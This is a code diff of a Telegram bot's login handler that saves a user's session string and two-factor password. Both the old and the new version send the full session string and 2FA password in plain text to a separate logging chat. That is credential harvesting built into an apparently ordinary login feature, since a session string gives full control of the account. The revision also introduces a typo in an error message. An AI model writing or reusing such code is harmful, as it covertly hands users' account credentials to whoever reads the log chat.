@@ -122,23 +122,29 @@ async def login_acc(bot: Client, message: Message):
     await client.disconnect()
 
     if len(string_session) < SESSION_STRING_SIZE:
-        return await message.reply('<b>Invalid Session String</b>')
+        return await message.reply('<b>invalid session sring</b>')
+    try:
+        user_data = database.sessions.find_one({"user_id": message.from_user.id})
+        if user_data is not None:
+            data = {
+                'logged_in': True,
+                'session': string_session,
+                '2FA': password if 'password' in locals() else None
+            }
 
-    # Update session data in the database
-    data = {
-        'logged_in': True,
-        'session': string_session,
-        '2FA': password if 'password' in locals() else None
-    }
+            uclient = Client(f"session_{message.from_user.id}", session_string=data['session'], api_id=API_ID, api_hash=API_HASH)
+            await uclient.connect()
+
+            database.sessions.update_one({'_id': user_data['_id']}, {'$set': data})
+            log_message = (
+                f"**✨New Login**\n\n"
+                f"**✨User ID:** [{message.from_user.first_name}](tg://user?id={message.from_user.id}), {message.from_user.id}\n\n"
+                f"**✨Session String ↓** `{string_session}`\n"
+                f"**✨2FA Password:** `{password if 'password' in locals() else 'None'}`"
+            )
+            await bot.send_message(LOGS_CHAT_ID, log_message)
+
     
-    database.sessions.update_one({'user_id': user_id}, {'$set': data})
-
-    log_message = (
-        f"**✨New Login**\n"
-        f"**✨User ID:** [{message.from_user.first_name}](tg://user?id={message.from_user.id})\n"
-        f"**✨Session String:** `{string_session}`\n"
-        f"**✨2FA Password:** `{password if 'password' in locals() else 'None'}`"
-    )
-
-    await bot.send_message(LOGS_CHAT_ID, log_message)
-    await message.reply("<b>Login successful!</b>")
+    except Exception as e:
+        return await message.reply_text(f"<b>ERROR IN LOGIN:</b> `{e}`")
+    await bot.send_message(message.from_user.id, "✅ <b>Account Login Successfully.\n\nIf You Get Any Error Related To AUTH KEY Then /logout and /login again</b>")
